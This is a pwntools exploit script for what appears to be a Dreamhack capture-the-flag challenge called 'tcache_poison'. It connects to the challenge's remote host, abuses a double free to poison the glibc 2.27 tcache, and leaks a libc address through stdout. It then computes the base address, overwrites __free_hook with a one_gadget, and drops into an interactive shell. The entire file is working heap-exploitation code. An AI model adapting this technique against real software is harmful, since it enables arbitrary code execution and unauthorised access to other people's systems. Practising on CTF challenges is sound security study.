from pwn import *

#p = process('./tcache_poison')
p = remote('host3.dreamhack.games', 24545)
e = ELF('./tcache_poison')
l = ELF('./libc-2.27.so')

def slog(symbol, addr): return success(symbol + ': ' + hex(addr))

def alloc(size, content):
    p.sendlineafter(b'Edit\n', b'1')
    p.sendlineafter(b': ', str(size).encode())
    p.sendafter(b': ', content)

def free():
    p.sendlineafter(b'Edit\n', b'2')

def print_content():
    p.sendlineafter(b'Edit\n', b'3')

def edit(content):
    p.sendlineafter(b'Edit\n', b'4')
    p.sendafter(b': ', content)

alloc(0x30, b'dreamhack')
free()

edit(b'B'*8 + b'\x00')
free()

stdout_addr = e.symbols['stdout']
alloc(0x30, p64(stdout_addr))

alloc(0x30, b'BBBBBBBB')

_io_2_1_stdout_lsb = p64(l.symbols['_IO_2_1_stdout_'])[0:1]
alloc(0x30, _io_2_1_stdout_lsb)
#gdb.attach(p)
#pause()

print_content()
p.recvuntil(b'Content: ')
stdout = u64(p.recv(6).ljust(8, b'\x00'))
lb = stdout - l.symbols['_IO_2_1_stdout_']
fh = lb + l.symbols['__free_hook']
og = lb + 0x4f432

slog('libc_base', lb)
slog('free_hook', fh)
slog('one_gadget', og)

alloc(0x40, b'dreamhack')
free()

edit(b'C'*8 + b'\x00')
free()

alloc(0x40, p64(fh))

alloc(0x40, b'D'*8)

alloc(0x40, p64(og))
free()

p.interactive()
